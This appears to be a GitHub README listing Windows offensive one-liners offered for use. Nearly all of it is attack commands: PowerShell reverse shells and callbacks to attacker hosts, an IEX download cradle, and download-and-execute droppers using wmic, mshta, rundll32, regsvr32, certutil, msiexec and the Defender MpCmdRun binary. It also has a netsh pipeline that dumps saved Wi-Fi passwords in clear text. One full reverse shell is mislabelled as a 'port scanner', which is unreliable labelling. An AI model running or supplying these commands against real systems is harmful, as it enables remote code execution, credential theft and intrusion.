This is a repository for github One Liners for Windows. You can port scan, get reverse shells with so many methods like below.

Reverse Shell Command Execution through UDP
<pre><code>powershell -nop -c "$s=New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Dgram,[System.Net.Sockets.ProtocolType]::UDP);$s.Connect((New-Object System.Net.IPEndPoint([system.net.IPAddress]::Parse(\"<HOSTIP>\"),53)));$s.send(([System.Text.Encoding]::ASCII).GetBytes((whoami)));"</pre></code>

Reverse Shell Command Execution through tcp
<pre><code>powershell -c "whoami | % {$w=(New-Object System.IO.StreamWriter((New-Object System.Net.Sockets.TCPClient([System.Net.IPAddress]::Parse(\"<HOSTIP>\"),80)).GetStream()));$w.WriteLine($_);$w.Flush()}"</pre></code>

Download PS Script
<pre><code>powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"</pre></code>

PS Port Scanner
<pre><code>$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()</pre></code>

WMIC Dropper
<pre><code>wmic os get /format:"https://webserver/payload.xsl"</pre></code>

payload.xsl :
https://raw.githubusercontent.com/trickster0/Windows_OneLiners/master/payload.xsl

MSHTA Download
<pre><code>mshta.exe http://192.168.1.109:8080/5EEiDSd70ET0k.hta</pre></code>

RUNDLL Execute from SMB
<pre><code>rundll32.exe \\192.168.1.109\vabFG\test.dll,0</pre></code>

REGSRV Download and Execute
<pre><code>regsvr32 /s /n /u /i:http://192.168.1.109:8080/xo31Jt5dIF.sct scrobj.dll</pre></code>

CERTUTIL Download and Execute
<pre><code>certutil.exe -urlcache -split -f http://192.168.1.109/shell.exe shell.exe & shell.exe</pre></code>

MSIEXEC Download and Execute
<pre><code>msiexec /q /i http://192.168.1.109/1.msi</pre></code>

Grab all wireless passwords with PS
<pre><code>(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize</pre></code>

Download through Windows Defender
<pre><code>"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -DownloadFile -url https://maliciousip/maliciousfile.exe -Path C:\Users\Public\maliciousfile.exe</pre></code>

P.S These were not made by me.
